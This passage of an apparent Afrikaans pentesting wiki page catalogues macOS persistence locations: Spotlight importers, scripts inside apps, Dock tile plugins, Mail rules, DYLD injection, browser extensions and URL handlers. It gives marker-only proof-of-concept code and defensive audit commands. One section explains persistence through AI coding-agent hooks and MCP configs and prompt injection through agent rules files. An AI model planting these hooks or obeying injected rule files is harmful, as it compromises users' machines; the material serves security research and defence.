Die onderliggende meganisme van Spotlight behels ’n sentrale proses genaamd 'mds', wat staan vir **'metadata server'.** Hierdie proses koördineer die hele Spotlight-diens. Daarbenewens voer verskeie 'mdworker'-daemone ’n verskeidenheid instandhoudingstake uit, soos om verskillende lêertipes te indekseer (`ps -ef | grep mdworker`). Hierdie take word moontlik gemaak deur Spotlight-invoerproppe, of **".mdimporter-bundels**", wat Spotlight in staat stel om inhoud oor ’n uiteenlopende reeks lêerformate te verstaan en te indekseer.

Die inproppe of **`.mdimporter`**-bundels is op die plekke wat vroeër genoem is. ’n Nuwe bundel moet ontdek word en met ’n lêertipe ooreenstem, en Spotlight moet ’n ooreenstemmende lêer werklik indekseer; die kopiëring van ’n bundel alleen bewys nie dat dit gelaai is nie. [Apple se MDImporter-verwysing](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) verbind die laai daarvan met ’n geskikte lêer wat verander het. Spotlight-invoeruitvoering op macOS 26 is nie hier getoets nie.

Dit is moontlik om alle `mdimporters` te vind wat loop deur die volgende uit te voer:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

En byvoorbeeld **/Library/Spotlight/iBooksAuthor.mdimporter** word gebruik om hierdie tipe lêers te ontleed (uitbreidings `.iba` en `.book`, onder andere):

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> As jy die Plist van ander `mdimporter` nagaan, sal jy dalk nie die inskrywing **`UTTypeConformsTo`** vind nie. Dit is omdat dit ’n ingeboude _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) is en nie uitbreidings hoef te spesifiseer nie.
>
> Boonop geniet stelsel se verstekplugins altyd voorrang, dus kan ’n aanvaller slegs toegang kry tot lêers wat nie andersins deur Apple se eie `mdimporters` geïndekseer word nie.

Om jou eie importer te skep, kan jy met hierdie projek begin: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) en dan die naam verander, **`CFBundleDocumentTypes`** verander en **`UTImportedTypeDeclarations`** byvoeg sodat dit die uitbreiding ondersteun wat jy wil ondersteun, en dit in **`schema.xml`** weerspieël.\
Verander dan die kode van die funksie **`GetMetadataForFile`** om jou payload uit te voer wanneer ’n lêer met die verwerkte uitbreiding geskep word.

Laastens, **bou en kopieer jou nuwe `.mdimporter`** na een van die drie voorafgaande liggings. Jy kan nagaan of dit gelaai is deur **die logs te monitor** of **`mdimport -L`** uit te voer.

> [!TIP]
> Hoewel die importer-sandbox baie beperkend is, indekseer `mdworker` lêers met **bevoorregte leestoegang**. ’n Kwaadwillige `.mdimporter` kan dus die *inhoud* van lêers in TCC-beskermde liggings (Downloads, Pictures, Desktop, …) lees en versamelde metadata exfiltrate sonder enige TCC-prompt — die **"Sploitlight" TCC bypass (CVE-2025-31199)**, wat in macOS Sequoia 15.4 reggestel is.<sup>[[55]](#references)</sup>

### ~~Voorkeurpaneel~~

> [!CAUTION]
> Dit lyk nie of dit meer werk nie.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Nuttig om sandbox te bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Dit vereis ’n spesifieke gebruikeraksie
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Beskrywing

Dit lyk nie of dit meer werk nie.<sup>[[26]](#references)</sup>

### Toepassingskriplêers

Writeup: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
  - Maar die geteikende toepassing moet geïnstalleer wees en deur die slagoffer uitgevoer/gebruik word
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

’n **Geïnterpreteerde skrip wat ’n geïnstalleerde toepassing of nutsmiddel werklik uitvoer** en wat die aanvaller kan wysig. Bevestig die lêer se toestemmings en die oproeppad; dit is nie genoeg om bloot ’n `.sh`- of `.py`-lêer te vind nie. Apple se [code-signing guide](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) sê dat ondertekende toepassingbundels hulpbronne, insluitend skripte, verseël. As ’n skrip binne die bundel gewysig word, word dié verseëling verbreek, en dit kan opgespoor of geblokkeer word wanneer die bundel gevalideer word. ’n Eksterne skrip soos Homebrew se lanseerder het ander ondertekenings- en vertrouensgedrag. Historiese voorbeelde uit die writeup sluit in:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – ’n skrip wat deur ouer Sublime Text-weergawes gebruik is; die lêer en die gebruik daarvan tydens opstart moet vir die geïnstalleerde weergawe nagegaan word. Dit was afwesig op die toets-Mac.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) of **`/usr/local/bin/brew`** (Intel) – ’n Bash-lanseerder wat uitgevoer word wanneer daardie `brew`-pad gebruik word, indien dit geïnstalleer is en deur die aanvaller geskryf kan word. `/opt/homebrew/bin/brew` was ’n skryfbare Bash-skrip op die toets-Mac; dit is ’n plaaslike waarneming, nie ’n algemene Homebrew-toestemmingsreël nie.
- **IDLE se `idlemain.py`** binne ’n Python-toepassingbundel – skryfregte vereis moontlik admin-toestemming, maar dit loop met die IDLE-gebruiker se identiteit.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – ’n historiese shell-skrip wat as root loop wanneer die ooreenstemmende `org.wireshark.ChmodBPF` launchd-werk geïnstalleer is. Die skrip en werk was afwesig op die toets-Mac.

#### Beskrywing en uitbuiting

Sommige nutsmiddels en toepassings voer geïnterpreteerde skripte tydens looptyd uit. ’n Skryfbare skrip kan bygevoegde opdragte uitvoer wanneer die spesifieke oproeper dit die volgende keer uitvoer, mits handtekeningvalidering, kwarantyn en ander kontroles dit toelaat. Die oorspronklike navorsing het verskeie installasies uit 2019 gedemonstreer; gaan hul paaie en snellers weer na op die teikenweergawe.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

Hierdie kopietoets het `marker fired: True` op macOS 26.5.2 opgelewer; die oorspronklike launcher is onaangeraak gelaat. Dit bewys dat die invoegpunt in die kopie uitgevoer word, nie dat ’n gewysigde ondertekende app-bondel of ’n werklike Homebrew-installasie elke lanseringskontrole sal slaag nie.

### Dock Tile Plugins

Skrywe: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Vereis dat ’n app wat die plug-in verklaar, deur die Dock opgespoor/geregistreer en verwerk word
  - Die plug-in laai in ’n **Apple-signed** helper wat geen app-sandbox-regte het nie en **library validation disabled** het. Hierdie helper is nie in die Background Task Management UI in die aangehaalde navorsing gewys nie; die sigbaarheid daarvan op ’n teikenweergawe behoort nagegaan te word.
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, waarna verwys word met die **`NSDockTilePlugIn`**-sleutel in die app se `Info.plist`; die plug-in se eie `Info.plist` stel **`NSPrincipalClass`** in.

#### Beskrywing & Exploitation

Wanneer ’n app `NSDockTilePlugIn` verklaar, kan die Dock die verwysde bondel in die **`com.apple.dock.external.extra`** XPC-helper (`...extra.arm64` op Apple Silicon) laai wanneer die gebruiker aanmeld of wanneer die teël bygevoeg word; die app self hoef nie te begin nie. Dit vereis dat die app deur macOS opgespoor/geregistreer en aanvaar word. Die helper is **Apple-signed**, het geen `com.apple.security.app-sandbox`-regte nie en het `com.apple.security.cs.disable-library-validation`. Die hoofklas se **`setDockTile:`**-metode word tydens laai aangeroep; van daar af kan dit op verspreide kennisgewings inteken (bv. `com.apple.screenIsLocked`) vir latere gebeure.<sup>[[38]](#references)</sup>

Op macOS 26.5.2 het leesalleen-`codesign`-inspeksie die helper se Apple-handtekening en regte bevestig, en verskeie geïnstalleerde apps het `NSDockTilePlugIn` verklaar. Geen nuwe plug-in is op daardie Mac geïnstalleer of gelaai nie, dus bly die uitvoering van ’n nuutgeskrewe bondel op daardie weergawe ongetoets.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

Writeup: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Die widget-uitbreiding loop in sy **eie proses**, en om een by te voeg, veroorsaak nie ’n Background Task Management-waarskuwing nie
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)
  - Die config plist is in ’n TCC-beskermde container, dus vereis redigering daarvan van buite Full Disk Access of ’n TCC-omseiling

#### Ligging

- Widget-uitbreidingsbundel: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Aktiewe/geregistreerde widgets: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (sleutels `widgets.instances` en `widgets.widgets`)

#### Beskrywing & Uitbuiting

’n WidgetKit-uitbreiding wat binne ’n app ingesluit is, loop in **sy eie proses** wat deur Notification Center bestuur word. Deur ’n instansie in `widgets.instances` te registreer (’n base64 `NSKeyedArchiver`-gekodeerde `CHSWidget`-blob met ingebedde `INIntent`-data) en NotificationCenter te herbegin, word die widget gelaai en word sy `TimelineProvider`-/intent-kode uitgevoer.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Mail.app-reëls (Run AppleScript)

Writeup: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar Mail.app moet met ’n rekening opgestel wees en loop; die trigger is ’n inkomende e-pos
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - As die reëls/scripts buite Mail gewysig word, moet Mail moontlik gesluit wees en Full Disk Access op moderne macOS gegee word

#### Ligging

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (plaaslike reëls; `V10` op Sonoma/Sequoia, `V11`+ op nuwer weergawes)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (iCloud-gesinkroniseerde reëls, kry voorkeur)
- Reëls se aktivering: **`RulesActiveState.plist`**; AppleScript-payload: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Beskrywing en uitbuiting

’n Apple Mail-**reël** kan ’n *"Run AppleScript"*-aksie hê. Deur ’n reël by te voeg wat by ’n vervaardigde **onderwerpreël** pas en ’n aanvallerskrip uitvoer, kry die aanvaller **afstandsnaspoorbare, sluipende** kode-uitvoering in Mail se konteks wanneer die spesiale e-pos aankom — ’n aanvalsvector wat baie persistence-skandeerders ontduik omdat geen LaunchAgent/Login Item geskep word nie.<sup>[[42]](#references)</sup> As die reël ook gestel word om die trigger-e-pos **te verwyder**, word die bewyse versteek. Verdedigers kan direk daarna soek:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Configuration Profiles (.mobileconfig)

Skrywe: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Nuttig om sandbox te bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Moderne macOS vereis **handmatige gebruikergoedkeuring** in Stelselinstellings → *Toestelbestuur* (`profiles install` sonder gebruikerhandeling is nie meer beskikbaar buite MDM nie)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Geïnstalleerde profiele is onder **`/Library/Managed Preferences/`** en **`/var/db/ConfigurationProfiles/`**; ’n profiel is ’n XML-plist met ’n `PayloadContent`-skikking.

#### Beskrywing en Exploitation

’n `.mobileconfig` is nie ’n primitief vir direkte kode-uitvoering nie, maar dit kan konfigurasie laat voortbestaan, soos ’n **vertroude wortel-CA** (`com.apple.security.root`), ’n **globale of PAC-instaanbediener** (`com.apple.proxy.*`), **bestuurde voorkeure** (`com.apple.ManagedClient.preferences`) of beperkings. Op macOS 10.15 en later bepaal Apple se [`PayloadRemovalDisallowed`-definisie](https://developer.apple.com/documentation/devicemanagement/toplevel) dat die instelling daarvan op `true` vir ’n **handmatig geïnstalleerde** profiel sonder ’n payload vir ’n verwyderingswagwoord **administrateurverifikasie** vereis om dit te verwyder; dit maak die profiel nie absoluut onverwyderbaar nie. MDM-geïnstalleerde profiele het afsonderlike bestuurs- en verwyderingsreëls.<sup>[[44]](#references)</sup>

> [!WARNING]
> ’n Gewone konfigurasieprofiel het **geen payload-tipe wat ’n arbitrêre `LaunchDaemon`/`LaunchAgent` installeer nie**. Om ’n daemon só te installeer, vereis volledige **MDM-inskrywing** plus ’n bestuursagent/-skrip — moenie `.mobileconfig` as ’n afleweringsmeganisme vir launchd beskou nie.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### DYLD_INSERT_LIBRARIES Persistence

- Nuttig om sandbox te omseil: [🔴](https://emojipedia.org/large-red-circle)
  - dyld **strip** `DYLD_*` vir SIP-/platform-binaries, hardened-runtime-apps en setuid-teikens, dus spuit dit slegs in onbeskermde prosesse in en omseil **nie** SIP/die hardened runtime nie
- TCC-bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Betroubare vorm: die **`EnvironmentVariables`**-dict binne ’n kwaadwillige `LaunchAgent`/`LaunchDaemon`-plist (loop tydens aanmelding/ selflaai)
- Verouderd/histories (slegs vir verslagdoening): **`~/.MacOSX/environment.plist`** (verwyder in 10.8) en **`/etc/launchd.conf`** (verwyder in 10.10)

#### Beskrywing & Exploitation

As ’n aanvaller `DYLD_INSERT_LIBRARIES` in ’n slagofferproses se omgewing kan kry, laai dyld die aanvaller se dylib (die konstruktor daarvan loop) in daardie proses. Die persistente variant sluit die veranderlike in ’n LaunchAgent in, sodat elke keer wat die job loop, dit weer inspuit. Let daarop dat `launchctl setenv DYLD_*` op moderne macOS gefiltreer word, dus moet jy dit eerder in die plist insluit.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

Vir die volledige meganika van dylib injection/hijacking, sien:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### KI-koderingsagent-CLI's (hooks, MCP-bedieners, reëllêers)

Writeups: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Rules File Backdoor (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
  - Vereis dat die ontwikkelaar die betrokke agent gebruik. Opdragte tydens opstart loop met daardie gebruiker se voorregte wanneer die agent hul konfigurasie aanvaar; vertroue in die werkruimte en MCP-goedkeuring verskil volgens produk en sessiemodus.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle) (loop as die gebruiker; erf alles waartoe die terminale/agent reeds toegang het)

#### Ligging

Die eksplisiete hook- en MCP-konfigurasielêers kan **shell-opdragte of kindprosesse laat loop wanneer die ontwikkelaar die nutsmiddel gebruik** — hetsy vanaf 'n globale lêer per gebruiker (volharding) of vanaf 'n lêer wat in 'n repo vasgelê is (voorsieningsketting). `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` en redigeerderreëls is **instruksies aan 'n agent**, en waarborg nie dat 'n shell-opdrag uitgevoer word wanneer dit gelees word nie; die uitwerking hang af van die agent se gedrag en nutsmiddeltoestemmings. Gaan die huidige vertrouens- en goedkeuringsreëls van elke produk na.

- **Claude Code**
  - `~/.claude/settings.json`, projek `.claude/settings.json`, `.claude/settings.local.json` en die worteltoeganklike **`/Library/Application Support/ClaudeCode/managed-settings.json`** (MDM-/bestuurde instellings **kan nie deur die gebruiker oorskryf word nie** → sterk volharding)
  - `hooks`-objek — gebeurtenisse `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — elkeen voer 'n shell-`command` uit
  - `statusLine.command` — 'n shell-opdrag wat uitgevoer word om die statuslyn te vertoon (elke sessie)
  - MCP-bedieners in `~/.claude.json` / projek `.mcp.json` — `command`+`args` word as kindprosesse geloods
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — instruksies wat prompt injection kan probeer, onderhewig aan agentgedrag en nutsmiddeltoestemmings
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` word as kindprosesse geloods); projekinstruksies in `AGENTS.md`
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, MCP-bedieners); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … voer opdragte uit); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot `.github/copilot-instructions.md`

#### Beskrywing en uitbuiting

As 'n akteur die rekening se globale gebruikerinstellings kan wysig, kan die hooks of MCP-opdragte daarvan in toekomstige sessies onder daardie rekening loop. 'n Konfigurasie wat deur 'n repo beheer word, is 'n afsonderlike geval: [huidige sekuriteitsdokumentasie vir Claude Code](https://code.claude.com/docs/en/security) beskryf 'n interaktiewe dialoog vir vertroue in die werkruimte en 'n afsonderlike goedkeuringsversoek vir projekbedieners in `.mcp.json`. [Die toestemmingsmatriks](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) meld dat hooks kan loop nadat 'n ouergids vertrou is, en dat `claude -p`/SDK-sessies nie die interaktiewe vertrouensversoek wys nie; projek-MCP-bedieners koppel in hierdie nie-interaktiewe modusse sonder 'n goedkeuringsversoek. Die gerapporteerde pre-trust-bypass vir projekhooks, CVE-2025-59536, is [in 2025 reggestel](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); moenie dit as huidige verstekgedrag beskou nie. Afleweringsvektore kan 'n gekompromitteerde repo of 'n kwaadwillige installeerder insluit. Prompt injection deur 'n reëllêer is minder voorspelbaar as 'n eksplisiete hook en hang steeds van nutsmiddelgoedkeurings af.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Voorbeeld van globale gebruikerinstellings vir Claude Code; plaas dit slegs in 'n weggooibare rekening wanneer jy toets:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Voorbeeld van Codex MCP-konfigurasie op gebruikersvlak:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Voorbeeld van ’n Cursor-hook-konfigurasie; kontroleer die skema van die geïnstalleerde weergawe voordat jy dit gebruik:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Blaaieruitbreidings (Chromium: Chrome / Brave / Edge)

Beskrywing: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [ExtensionInstallForcelist abuse on macOS](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Vereis ’n ondersteunde blaaier en ’n geïnstalleerde, geaktiveerde uitbreiding. External Extensions op macOS vereis gebruikerbevestiging; ’n bestuurde force-install vereis ’n toepaslike ondernemingsbeleid.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> Dit verskil van **native messaging hosts** (sien die afdeling *Chrome native messaging hosts* hierbo). Hier is die volharding die **outomaties geïnstalleerde uitbreiding** self.

#### Ligging

- **External Extensions JSON** (ontdek wanneer die blaaier begin, waarna ’n aktiveringsboodskap op macOS verskyn):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (per gebruiker) of `/Library/Application Support/Google/Chrome/External Extensions/` (alle gebruikers)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- **Force-install volgens ondernemingsbeleid** via bestuurde voorkeure / ’n konfigurasieprofiel:
  - `com.google.Chrome`-sleutel `ExtensionInstallForcelist` (Brave `com.brave.Browser`, Edge `com.microsoft.Edge`), gelees vanaf `/Library/Managed Preferences/` of ’n geïnstalleerde `.mobileconfig`

#### Beskrywing en uitbuiting

Dit is twee verskillende installasieroetes. Chrome se [dokumentasie oor eksterne installering](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) sê dat **Windows- en macOS-gebruikers ’n uitbreiding wat via ’n *External Extensions*-lêer aangebied word, moet bevestig en aktiveer**; dit word nie bloot uitgevoer omdat daardie JSON-lêer geskryf is nie. Vir installering vir alle gebruikers op macOS vereis Chrome ook dat die eksterne-uitbreidingslêer beskerm word teen wysiging deur onbevoorregte gebruikers. ’n Bestuurde `ExtensionInstallForcelist`- of `ExtensionSettings`-beleid kan ’n uitbreiding installeer en vaspen sonder daardie gebruikerinteraksie; [Google se Mac-beleidsriglyne](https://support.google.com/chrome/a/answer/7517624) beskryf die bestuurde konfigurasie en meld dat gebruikers nie force-installed uitbreidings kan verwyder nie. Dit is ’n ontplooiingsroete via beleid, nie ’n `defaults write`-kortpad per gebruiker nie.<sup>[[49]](#references)</sup>

> [!WARNING]
> Op macOS moet ’n *External Extensions*-JSON-manifes na ’n **Chrome Web Store**-opdaterings-URL verwys, nie na ’n plaaslike CRX nie. Ontplooiing via bestuurde beleid het sy eie ondernemingsvoorvereistes en kan ’n bestuurde, selfgehuisveste opdaterings-URL toelaat. Vir ’n plaaslike, uitgepakte uitbreiding in ’n toetsprofiel is Chrome se ontwikkelaarmodus-skakelaar `--load-extension=/path` ’n afsonderlike meganisme; dit maak nie ’n External Extensions-JSON-lêer selfuitvoerend nie. Moenie ’n skrywe na `Secure Preferences` as gelykstaande aan een van die gedokumenteerde registrasieroetes beskou nie.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Begin Chrome in daardie weggooibare rekening en let op die toestemmingsversoek; die uitbreiding se eie gedrag is die uitvoerings-PoC sodra die gebruiker dit aanvaar. Verwyder ná die toets die manifest en deaktiveer/deïnstalleer die uitbreiding in daardie profiel. Hierdie pad is nie in die aktiewe Chrome-profiel op die navorsings-Mac getoets nie. Die bestuurde-beleid-roete is ook nie daar ontplooi nie.

Force-install- en External Extensions-verwysings gebruik **Chrome Web Store**-uitbreiding-ID’s; vir die laervlak-truuk om stilweg ’n plaaslike uitbreiding in te spuit deur die profiel se HMAC-getekende `Secure Preferences` te wysig, en ander misbruik van Chromium-prosesse, sien:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### URL-skema- en lêertipehanteerders (LaunchServices)

Writeup: [Remote Mac Exploitation Via Custom URL Schemes (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Die sneller is dat die slagoffer op ’n skakel klik (bv. in Chrome/Brave/Safari) of ’n lêer van die geregistreerde tipe oopmaak
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- ’n App-bundel se `Info.plist` wat **`CFBundleURLTypes`/`CFBundleURLSchemes`** (pasgemaakte URL-skema) of **`CFBundleDocumentTypes`** (lêeruitbreiding/UTI) verklaar
- Effektiewe verstekwaardes per gebruiker kan in **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** (`LSHandlers`-skikking) verskyn. Apple se ondersteunde API om ’n verstek vir ’n URL-skema te kies, is `LSSetDefaultHandlerForURLScheme`; om daardie plist direk te skryf, is nie ’n gedokumenteerde registrasie- of kasopdateringsmetode nie.

#### Beskrywing & uitbuiting

Launch Services verkry URL-skema- en dokumentaansprake uit ’n geregistreerde app se `Info.plist`. [Apple se registrasiegids](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) sê dat registrasie kan plaasvind wanneer Finder die app ontdek, met die selflaai of aanmelding, of via ’n eksplisiete registrasie-API; om bloot ’n app êrens neer te sit, waarborg nie dat registrasie onmiddellik geaktiveer word nie. Ná registrasie kan die oopmaak van ’n ooreenstemmende URL of dokument die gekose hanteerder-app begin, onderhewig aan die gebruiker se keuse van verstekhanteerder en die normale macOS-begin-kontroles. Die ondersteunde `LSSetDefaultHandlerForURLScheme`-API verander ’n URL-hanteerder wat die gebruiker verkies; dit laat nie ’n nuut neergesette app outomaties uitvoer nie.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

Geen app is geregistreer nie en geen hanteerdervoorkeur is op die macOS 26.5.2-navorsings-Mac verander nie. Om ’n werklike hanteerder te toets, gebruik ’n weggooibare gebruikersrekening, registreer ’n app wat slegs ’n merker bevat en ’n unieke skema gebruik, roep sy URL aan en verwyder dan die app en sy registrasie.

Vir ’n diepgaande uiteensetting van hoe om lêeruitbreidings- en URL-skema-hanteerders te lys/te misbruik, sien:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Python-opstartlêers (`.pth` / `usercustomize` / `sitecustomize`)

